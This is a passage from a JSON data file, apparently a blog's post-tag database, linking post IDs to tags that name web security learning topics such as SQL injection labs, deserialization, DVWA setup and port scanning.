j3xc65iq7"},{"post_id":"cl2n8fso800075l9jbdke6nj7","tag_id":"cl2n8eji8000xs19jamqu7722","_id":"cl2n8fsoa000e5l9j0dbu8zez"},{"post_id":"cl2n8fso900095l9jdp7ua4yt","tag_id":"cl2n8ejht0003s19j72iwd4wj","_id":"cl2n8fsoa000f5l9jbzhx86ul"},{"post_id":"cl2n8fso900095l9jdp7ua4yt","tag_id":"cl2n8eji00007s19j7bbk8dno","_id":"cl2n8fsoa000g5l9jh8zzbopk"},{"post_id":"cl2n8fso9000b5l9j61ub8nqo","tag_id":"cl2n8eji2000as19j23p0f2hn","_id":"cl2n8fsob000h5l9j9oid3v82"},{"post_id":"cl2n8fso9000b5l9j61ub8nqo","tag_id":"cl2n8eji3000ds19j2vji6kac","_id":"cl2n8fsob000i5l9jek0uej06"},{"post_id":"cl2n8fso9000b5l9j61ub8nqo","tag_id":"cl2n8eji4000es19j92bo8m8b","_id":"cl2n8fsob000j5l9j71by2vqr"},{"post_id":"cl2n8fsoa000d5l9jdxcrc3bd","tag_id":"cl2n8eji2000as19j23p0f2hn","_id":"cl2n8fsob000k5l9jdmoy86vg"},{"post_id":"cl2n8fsoa000d5l9jdxcrc3bd","tag_id":"cl2n8eji3000ds19j2vji6kac","_id":"cl2n8fsob000l5l9j9sbgf42l"},{"post_id":"cl2n8fsoa000d5l9jdxcrc3bd","tag_id":"cl2n8eji4000es19j92bo8m8b","_id":"cl2n8fsob000m5l9j0sft8ope"}],"Tag":[{"name":"PHP伪协议","_id":"cl2n8ejht0003s19j72iwd4wj"},{"name":"反序列化","_id":"cl2n8eji00007s19j7bbk8dno"},{"name":"DVWA搭建","_id":"cl2n8eji2000as19j23p0f2hn"},{"name":"lamp搭建","_id":"cl2n8eji3000ds19j2vji6kac"},{"name":"sqli-labs","_id":"cl2n8eji4000es19j92bo8m8b"},{"name":"端口扫描","_id":"cl2n8eji6000ls19j3h7we44c"},{"name":"信息收集","_id":"cl2n8eji6000os19j2k2t2cl1"},{"name":"原创","_id":"cl2n8eji7000qs19j4osp73ak"},{"name":"流量分析","_id":"cl2n8eji7000ts19jgzsxdjft"},{"name":"反向代理","_id":"cl2n8eji8000us19j1cnldrod"},{"name":"XFF","_id":"cl2n8eji8000xs19jamqu7722"},{"name":"大小写绕过","_id":"cl2n8eji8000ys19jfsfaa8zg"}]}}